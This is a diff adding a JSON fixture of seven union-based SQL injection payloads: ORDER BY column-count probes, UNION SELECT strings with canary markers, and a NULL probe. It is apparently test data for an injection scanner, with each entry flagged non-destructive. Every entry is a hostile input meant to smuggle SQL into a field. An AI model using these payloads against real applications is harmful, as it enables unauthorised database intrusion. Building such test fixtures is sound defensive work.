@@ -1,0 +1,72 @@
+[
+  {
+    "name": "union_sqli_order_by_1",
+    "value": "' ORDER BY 1-- ",
+    "kind": "column_order_low",
+    "canary": "",
+    "columns": 1,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Union-based.md"
+  },
+  {
+    "name": "union_sqli_order_by_100",
+    "value": "' ORDER BY 100-- ",
+    "kind": "column_order_high",
+    "canary": "",
+    "columns": 100,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Union-based.md"
+  },
+  {
+    "name": "union_sqli_select_col1",
+    "value": "' UNION SELECT 'tc_union_canary_c1'-- ",
+    "kind": "union_select",
+    "canary": "tc_union_canary_c1",
+    "columns": 1,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Union-based.md"
+  },
+  {
+    "name": "union_sqli_select_col2",
+    "value": "' UNION SELECT 'tc_union_canary_c1','tc_union_canary_c2'-- ",
+    "kind": "union_select",
+    "canary": "tc_union_canary_c2",
+    "columns": 2,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Union-based.md"
+  },
+  {
+    "name": "union_sqli_select_col3",
+    "value": "' UNION SELECT 'tc_union_canary_c1','tc_union_canary_c2','tc_union_canary_c3'-- ",
+    "kind": "union_select",
+    "canary": "tc_union_canary_c3",
+    "columns": 3,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Union-based.md"
+  },
+  {
+    "name": "union_sqli_select_col4",
+    "value": "' UNION SELECT 'tc_union_canary_c1','tc_union_canary_c2','tc_union_canary_c3','tc_union_canary_c4'-- ",
+    "kind": "union_select",
+    "canary": "tc_union_canary_c4",
+    "columns": 4,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Union-based.md"
+  },
+  {
+    "name": "union_sqli_null_probe",
+    "value": "' UNION SELECT NULL,NULL,NULL-- ",
+    "kind": "union_null",
+    "canary": "",
+    "columns": 3,
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/Union-based.md"
+  }
+]
